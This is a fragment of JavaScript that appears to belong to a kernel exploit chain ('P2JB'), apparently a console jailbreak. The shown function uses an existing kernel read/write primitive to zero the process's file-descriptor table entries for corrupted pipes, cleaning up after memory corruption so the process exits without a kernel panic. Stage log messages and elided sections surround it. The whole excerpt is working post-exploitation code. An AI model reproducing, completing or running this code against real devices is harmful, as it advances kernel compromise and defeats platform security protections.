...
(async function () {
    try {
        ...
        async function stage_close_fd_detach(S) {
            await ulog("stage_close_fd_detach: entered after stage_elfldr return; no worker/pipeline changes before AIO");
            try {
                if (!S.kwrite || !S.fd_ofiles) {
                    await ulog("stage_close_fd_detach: missing kW/fd_ofiles - skipped");
                    return;
                }
                if (S.master_wfd !== S.master_rfd + 1 ||
                    S.victim_rfd !== S.master_rfd + 2 ||
                    S.victim_wfd !== S.master_rfd + 3) {
                    await ulog("stage_close_fd_detach: pipe fds not contiguous (master=" +
                        S.master_rfd + "," + S.master_wfd + " victim=" +
                        S.victim_rfd + "," + S.victim_wfd + ") - skipped to avoid touching unrelated fds");
                    return;
                }

                const fdent_size = Number(S.OFF.FILEDESCENT_SIZE);
                const detach_size = fdent_size * 4;
                const zero = malloc(detach_size);
                for (let i = 0; i < detach_size; i += 8) write64(zero + BigInt(i), 0n);

                const base = S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE;
                await ulog("stage_close_fd_detach: zeroing filedesc entries for master/victim pipes at " +
                    toHex(base) + " size=0x" + detach_size.toString(16));

                const wr = S.kwrite(base, zero, detach_size);
                await ulog("stage_close_fd_detach: kwrite returned " + toHex(wr) +
                    " expected=0x" + detach_size.toString(16));
                await ulog("stage_close_fd_detach: detached corrupted pipe fds from process fd table; kernel rw is intentionally no longer used after this point");
            } catch (e) {
                try { await ulog("stage_close_fd_detach: exception: " + e.message + " - skipped"); }
                catch (_) { }
            }
        }
        ...
        await ulog("T024_START: P2JB-v2.1 base; close-KP fix: detach corrupted master/victim pipe fd table entries after AIO/no-AIO returns; stage0-stage7 unchanged");
        ...
        await stage_close_fd_detach(S);

        await ulog("=== p2jb complete (T024 fd-detach close-safe active) ===");
